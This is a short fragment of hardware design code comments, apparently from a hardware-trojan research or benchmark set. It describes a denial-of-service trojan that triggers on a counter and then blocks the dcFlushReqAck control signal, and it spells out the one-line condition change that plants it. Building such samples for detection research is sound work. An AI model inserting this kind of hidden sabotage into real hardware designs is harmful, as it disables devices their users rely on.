 ...
 * 
 * Description:
 *   Disables operations by blocking dcFlushReqAck control signal
 *   
 * Trigger: Counter on dcFlushReqAck
 * Payload: Block dcFlushReqAck when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block dcFlushReqAck when trojan is active
//
// IMPORTANT: dcFlushReqAck is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (dcFlushReqAck && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: dcFlushReqAck && 0 = 0 (always false)
//   All operations controlled by dcFlushReqAck are blocked
